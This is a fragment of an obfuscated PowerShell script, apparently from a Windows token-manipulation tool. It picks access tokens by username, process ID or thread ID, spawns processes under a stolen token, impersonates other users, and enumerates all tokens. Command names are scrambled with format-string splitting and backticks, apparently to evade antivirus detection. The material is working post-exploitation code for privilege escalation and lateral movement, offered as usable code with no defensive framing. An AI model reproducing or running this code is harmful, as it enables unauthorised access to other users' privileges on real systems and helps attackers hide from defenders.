            [IntPtr]${htok`eN} =   ( &("{0}{1}" -f'it','eM')  ("{1}{0}{3}{4}{2}"-f 'B','VAriA','vz','le:','0g4t')).VALUe::"zE`RO"
            ${uNIq`U`eT`okens} = (&("{3}{2}{1}{0}"-f'okens','UniqueT','-','Get') -AllTokens ${AlL`TO`kens})."tOk`E`NByuS`eR"
            if (${uSE`Rn`AmE} -ne ${n`ULL} -and ${u`Se`R`NamE} -ne '')
            {
                if (${u`NiQu`eTOK`eNS}.("{1}{2}{0}"-f 'Key','C','ontains').Invoke(${us`eRn`AmE}))
                {
                    ${HT`O`Ken} = ${UnIq`uE`TokEns}[${U`s`erNaMe}]."HT`oKEN"
                    &("{2}{3}{0}{1}" -f'os','e','Write-Ve','rb') ("{0}{1}{4}{3}{5}{2}" -f 'Selecti','ng token','me','sern',' by u','a')
                }
                else
                {
                    &("{0}{2}{1}{3}" -f 'W','rro','rite-E','r') "A token belonging to the specified username was not found. Username: $($Username) " -ErrorAction ("{0}{1}"-f 'St','op')
                }
            }
            elseif ( ${PR`O`CeSSiD} -ne ${nU`Ll} -and ${proC`ESS`Id} -ne 0)
            {
                foreach (${T`O`ken} in ${AL`l`ToKens})
                {
                    if ((${TOK`EN} | &("{0}{1}{2}"-f 'G','et-Mem','ber') ("{1}{2}{3}{0}"-f'd','Pr','ocess','I')) -and ${t`o`Ken}."prO`c`ESSid" -eq ${prOCES`S`Id})
                    {
                        ${hT`ok`EN} = ${tOK`EN}."HtOK`eN"
                        &("{3}{0}{2}{1}" -f 'e','bose','-Ver','Writ') ("{6}{2}{0}{8}{3}{5}{7}{1}{4}"-f 'ecti','Proces','l','g t','sID','oken b','Se','y ','n')
                    }
                }

                if (${H`ToKeN} -eq   (  &("{2}{1}{0}" -f 'ABlE','ri','Va') ("{1}{0}" -f'4tvz','0G') -VAl)::"Ze`RO")
                {
                    &("{1}{0}{2}{3}"-f'e','Writ','-Er','ror') "A token belonging to ProcessId $($ProcessId) could not be found. Either the process doesn't exist or it is a protected process and cannot be opened. " -ErrorAction ("{0}{1}" -f 'St','op')
                }
            }
            elseif (${t`hr`ea`DId} -ne ${n`uLL} -and ${t`h`REad`iD} -ne 0)
            {
                foreach (${Tok`eN} in ${allT`ok`eNS})
                {
                    if ((${t`oK`EN} | &("{0}{1}{2}" -f'Get-Mem','be','r') ("{2}{1}{0}" -f'eadId','r','Th')) -and ${To`k`EN}."tHr`EaDid" -eq ${T`HrEa`Did})
                    {
                        ${HTo`kEn} = ${t`OkEn}."htoK`En"
                        &("{2}{0}{1}" -f'Verb','ose','Write-') ("{5}{3}{0}{2}{1}{4}"-f ' token by ','hre','T','ing','adId','Select')
                    }
                }

                if (${hTo`KEN} -eq   ( &("{1}{0}{2}"-f 'l','GET-VarIAb','E') ("{1}{0}" -f'4TVz','0g') -vALUeoN )::"Ze`Ro")
                {
                    &("{0}{2}{3}{1}"-f 'Write-','r','Er','ro') "A token belonging to ThreadId $($ThreadId) could not be found. Either the thread doesn't exist or the thread is in a protected process and cannot be opened. " -ErrorAction ("{0}{1}" -f 'St','op')
                }
            }
            elseif (${pRo`C`esS} -ne ${nu`LL})
            {
                foreach (${tO`KEN} in ${ALlT`o`kEnS})
                {
                    if ((${T`oKEN} | &("{3}{0}{2}{1}"-f '-M','ber','em','Get') ("{1}{0}{2}"-f 'roce','P','ssId')) -and ${t`ok`eN}."PROCe`S`SId" -eq ${pROCE`Ss}."Id")
                    {
                        ${Hto`kEn} = ${ToK`EN}."h`TOk`EN"
                        &("{0}{2}{1}"-f'Write-V','bose','er') ("{6}{4}{1}{3}{0}{8}{7}{5}{2}"-f 'roc','ng to','ct','ken by P','lecti','obje','Se','ss ','e')
                    }
                }

                if (${HtO`ken} -eq  ( &("{0}{1}" -f 'GEt-Ite','M')  ("{3}{2}{0}{1}"-f'4TV','z',':0G','vAriaBLE')).VAlue::"ze`RO")
                {
                    &("{1}{0}{2}" -f '-Erro','Write','r') "A token belonging to Process $($Process.Name) ProcessId $($Process.Id) could not be found. Either the process doesn't exist or it is a protected process and cannot be opened. " -ErrorAction ("{0}{1}" -f'Sto','p')
                }
            }
            else
            {
                &("{0}{2}{3}{1}" -f 'Writ','r','e-E','rro') ("{15}{8}{3}{1}{2}{13}{11}{9}{16}{5}{12}{14}{0}{6}{4}{10}{7}" -f ' or Pr','sern','ame','ly a U','o','d','ocess ','t','ust supp','Id, Th','bjec','s','Id',', Proces',',','M','rea')  -ErrorAction ("{0}{1}" -f'Sto','p')
            }

            
            if (${psC`MdLet}.PaRaMeTErsetnaMe -ieq ("{1}{2}{3}{0}"-f'cess','Creat','eP','ro'))
            {
                if (-not ${NO`ui})
                {
                    &("{0}{2}{1}{4}{3}" -f 'Set-','skt','De','ACLs','op')
                }

                &("{3}{2}{5}{4}{0}{1}{6}" -f 'oc','e','r','C','e-Pr','eat','ssWithToken') -hToken ${ht`oKEn} -ProcessName ${Cr`EAt`E`ProC`EsS} -ProcessArgs ${ProCE`s`saRGs} -PassThru:${pAsS`T`HrU}

                &("{2}{1}{3}{5}{4}{0}" -f 'f','o','Inv','ke','el','-RevertToS')
            }
            elseif (${i`mpE`RSON`ATeuS`Er})
            {
                &("{2}{3}{1}{4}{0}"-f'er','ImpersonateU','In','voke-','s') -hToken ${H`TO`keN} | &("{0}{1}"-f 'O','ut-Null')
                &("{0}{1}{3}{2}" -f 'Write-O','utp','t','u') "Running As: $([Environment]::UserDomainName)\$([Environment]::UserName) "
            }

            &("{2}{1}{3}{0}" -f's','To','Free-All','ken') -TokenInfoObjs ${a`lL`TO`KeNS}
        }
        elseif (${PscMDL`Et}.paRameTeRSEtNAmE -ieq ("{1}{0}" -f 'hoAmI','W'))
        {
            &("{2}{1}{3}{0}"-f 'utput','t','Wri','e-O') "$([Environment]::UserDomainName)\$([Environment]::UserName)"
        }
        else 
        {
            ${AL`ltoK`ENS} = &("{2}{0}{1}{3}" -f'm-All','T','Enu','okens')

            if (${p`scMdl`Et}.PaRameTERSetnAmE -ieq ("{0}{1}" -f 'Show','All'))
            {
                &("{0}{2}{1}{3}"-f 'W','pu','rite-Out','t') ${ALlTO`k`ens}
            }
            else
            {
                &("{2}{0}{1}"-f '-Ou','tput','Write') (&("{1}{4}{3}{0}{2}" -f'i','G','queTokens','-Un','et') -AllTokens ${aL`lTOk`enS})."t`OkENb`yUS`eR"."Va`luEs"
            }

            &("{2}{0}{1}{4}{3}"-f 'nvok','e','I','vertToSelf','-Re')

            &("{0}{1}{2}" -f 'Free','-AllTok','ens') -TokenInfoObjs ${AlL`To`ke`NS}
        }
    }


    
    &("{1}{0}" -f 'in','Ma')
}
